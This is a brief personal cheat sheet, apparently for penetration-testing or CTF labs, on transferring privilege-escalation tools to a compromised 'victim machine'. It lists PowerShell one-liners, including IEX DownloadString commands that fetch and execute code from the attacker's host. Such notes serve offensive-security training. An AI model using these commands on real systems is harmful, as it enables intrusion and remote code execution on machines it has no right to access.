###  Transfering Files to the victim machine after gaining intial access.

## This is something I have to google pretty often so the below will be a list of the tools I use the most when transfering **Priv Esc** or other tools onto the victim machine.

# PowerShell - This will need to be running on your victim machine to work.

First run **$ python -m SimpleHTTPServer**

1. $ powershell -c wget "http://<tun0 IP>:80/File-Name" -outfile New-File-Name (Make sure this file is in the current directory on the host machine and make sure python websever is running)
2. $ powershell "IEX (New-Object Net.WebClient).DownloadString('http://<tun0 IP>/File-Name')" - This will download and execute the file.
3. $ IEX (New-Object Net.WebClient).DownloadString('http://<tun0>/File-Name') - This will download and execute the file.
4. $ (new-object System.Net.WebClient).DownloadFile('http://<tun0>/File-Name','C:\Users\Something\Desktop\File-Name') - Will download the file from the command line.
5. 
